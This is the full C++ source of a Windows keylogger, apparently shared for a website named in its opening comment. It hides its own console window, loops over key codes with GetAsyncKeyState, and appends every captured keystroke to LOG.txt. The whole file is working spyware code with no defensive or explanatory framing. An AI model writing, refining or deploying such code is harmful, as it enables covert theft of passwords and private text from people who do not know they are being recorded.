//only for top4ek.pw

#if defined(UNICODE) && !defined(_UNICODE)
    #define _UNICODE
#elif defined(_UNICODE) && !defined(UNICODE)
    #define UNICODE
#endif
#include <tchar.h>
#include <windows.h>
#include <iostream>
#include <windows.h>
using namespace std;
#include <winuser.h>
#include <fstream>

int Save(int key_stroke,char *file)
{
    if ((key_stroke==1)||(key_stroke==2))
        return 0;
    FILE *OUTPUT_FILE;
    OUTPUT_FILE=fopen(file,"a+");
    cout<<key_stroke<<endl;
    if (key_stroke==VK_TAB
        ||key_stroke==VK_CONTROL
        ||key_stroke==VK_ESCAPE
        ||key_stroke==VK_END
        ||key_stroke==VK_UP
        ||key_stroke==VK_DOWN
        ||key_stroke==VK_HOME
        ||key_stroke==VK_LEFT
        ||key_stroke==VK_RIGHT
        )
        fprintf(OUTPUT_FILE,"%s"," ");
    else if (key_stroke==VK_SHIFT)
        fprintf(OUTPUT_FILE,"%s","\nSHIFT \n");
    else if (key_stroke==8)
        fprintf(OUTPUT_FILE,"%s","\nBACKSPACE \n");
    else if (key_stroke==32||key_stroke==13)//space or enter
        fprintf(OUTPUT_FILE,"%s","\n");
    else
       fprintf(OUTPUT_FILE,"%s",&key_stroke);
    fclose(OUTPUT_FILE);
    return 0;
}
void HideCMD()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
}

int WINAPI WinMain (HINSTANCE hThisInstance,HINSTANCE hPrevInstance,LPSTR lpszArgument,int nCmdShow)
{
    HideCMD();
    char i;
    while (true)
    {
        for (i=8 ; i<190 ; i++)
        {
            if (GetAsyncKeyState(i)==-32767)
                Save(i,"LOG.txt");

        }
    }
    return 0;
}
